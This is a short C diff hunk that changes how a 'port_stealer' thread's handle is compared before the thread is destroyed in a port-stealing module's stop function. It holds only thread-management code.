@@ -215,7 +215,7 @@ static void port_stealing_stop(void)
    pid = ec_thread_getpid("port_stealer");
    
    /* the thread is active or not ? */
-   if (!pthread_equal(pid, EC_PTHREAD_NULL))
+   if (!pthread_equal(pid, ec_thread_getpid(NULL)))
       ec_thread_destroy(pid);
    else
       return;
